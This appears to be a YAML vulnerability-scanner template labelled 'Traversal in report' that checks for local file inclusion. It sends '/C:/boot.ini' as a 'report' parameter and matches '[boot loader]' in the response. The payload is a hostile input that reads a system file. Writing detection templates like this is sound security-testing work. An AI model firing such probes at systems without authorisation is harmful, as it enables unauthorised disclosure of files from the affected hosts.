id: lfi6-0047
name: 'Traversal in report'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via report'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      report:
        - '/C:/boot.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[boot loader]'
